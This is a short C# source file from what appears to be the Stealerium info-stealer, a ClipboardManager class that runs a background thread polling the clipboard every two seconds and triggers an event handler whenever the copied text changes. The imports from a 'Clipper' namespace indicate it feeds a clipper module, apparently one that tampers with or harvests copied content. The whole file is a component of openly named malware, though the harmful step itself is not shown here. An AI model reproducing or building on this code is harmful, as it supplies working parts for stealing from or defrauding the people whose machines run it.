using System.Threading;
using Stealerium.Clipper;

namespace Stealerium.Helpers
{
    internal sealed class ClipboardManager
    {
        // Current clipboard content
        private static string _prevClipboard = "";
        public static string ClipboardText = "";
        public static Thread MainThread = new Thread(Run);

        // Run clipboard checker
        private static void Run()
        {
            while (true)
            {
                Thread.Sleep(2000);
                ClipboardText = Clipboard.GetText();
                if (ClipboardText == _prevClipboard) continue;
                _prevClipboard = ClipboardText;
                EventManager.Action();
            }
        }
    }
}